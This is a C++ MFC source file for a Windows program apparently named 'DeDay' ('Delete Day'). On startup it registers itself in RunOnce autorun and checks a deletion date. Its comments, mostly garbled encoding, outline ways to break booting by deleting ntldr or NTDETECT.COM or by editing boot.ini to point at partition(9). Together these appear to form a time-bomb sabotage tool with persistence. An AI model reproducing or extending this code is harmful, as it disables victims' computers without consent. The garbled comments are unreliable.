// DeDay.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"

#include <string>
using namespace std;

#include "DeDay.h"
#include "DeDayDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#include "DeleteDay.h"

// CDeDayApp

BEGIN_MESSAGE_MAP(CDeDayApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()

// CDeDayApp construction

CDeDayApp::CDeDayApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}


// The one and only CDeDayApp object

CDeDayApp theApp;

// CDeDayApp initialization

//================  ����� ����� ===================
/*
	1. � ���� ������� ������� ����� ������� ������� ��������� ���� ntldr

	2. ������ ����, ���� ������ ������� ��������� �NTDETECT.COM�. 
	����� �������� ������������ ����� ��������� �����������
������ ������������ (��� ������ �����-���� ���������). � �����: ��-
���������� �����, � �� � ����. � � ��� ���� ������ �� �������. ��������
���������� ��� ���, ��� ��������� ��������. � �� ��� �� ��������:
���������� ���� �� ���� �������� �����.

3. ���������� ���������� ����� �������������� ���� ����������
�boot.ini�. � ����� ���������, � �� �������� (����� �������� � ����
��� �� ������� �����������). � ���, ��������� ��� ��������� � �������
������ � ������ �� Windows ����
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
��� � �������� ������������ (������), �� ������� ������������ �������
���� � ������, ��� ����� � ����. � ��� ���� � ������ ��������������,
��������� ������������. � ���� ������� ������, ��� � ���� ��������-
�� �� �� ������, � �� ������� ������: ������ ��� �partition(1)� ��
�partition(9)�

*/

BOOL CDeDayApp::InitInstance()
{
	CWinApp::InitInstance();

	//������� ���� � RunOnce
	CDeleteDay dDay;
		dDay.AddToAutoRun();

	//��������� ���� ��������
	if (dDay.InspectDeleteData()) //���� ���� ���������� ��� �� �������
		return false;		//�� �� ���������� ���� ���������
	
	CDeDayDlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();

	return FALSE;
}
